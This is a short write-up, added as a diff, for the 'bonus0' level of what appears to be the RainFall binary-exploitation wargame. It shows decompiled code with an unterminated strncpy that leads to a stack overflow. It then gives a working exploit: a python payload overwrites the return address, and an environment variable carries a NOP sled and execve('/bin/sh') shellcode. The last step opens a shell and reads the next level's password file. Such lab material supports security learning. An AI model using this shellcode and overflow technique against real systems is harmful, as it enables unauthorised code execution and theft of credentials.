@@ -1,0 +1,40 @@
+scp -P 4242 bonus0@RainFall:bonus0 <local_path>
+
+----------------------------------------------------------------------------------
+
+  p(char *dest, char *prompt)
+  char buf[4096];
+  puts(prompt);
+  read(0, buf, 4096);
+  *strchr(buf, '\n') = 0;      // strip newline
+  strncpy(dest, buf, 20);      // <-- copies exactly 20 bytes, NO null 
+  terminator
+
+  pp(char *dest)
+  char b1[20];   // [ebp-0x30]
+  char b2[20];   // [ebp-0x1c]  <- immediately after b1 (20 bytes apart)
+  p(b1, " - ");
+  p(b2, " - ");
+  strcpy(dest, b1);            // <-- copies until a NUL byte
+  // appends a space, then:
+  strcat(dest, b2);
+
+  main
+  char dest[??];   // at esp+0x16, frame is only 0x40 bytes
+  pp(dest);
+  puts(dest);
+
+----------------------------------------------------------------------------------
+
+After some tests we foud that the overload happens at address 0xbffffe46
+----------------------------------------------------------------------------------
+
+python -c 'print "B"*4095+"\n"+"A"*9+"\x46\xfe\xff\xbf"+"B"*30' > /tmp/file
+
+cat /tmp/file - | env -i payload=$(python -c 'print "\x90"*500+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') ./bonus0
+
+----------------------------------------------------------------------------------
+
+whoami
+bonus1				WE'RE IN THE SHELL
+cat /home/user/bonus1/.pass
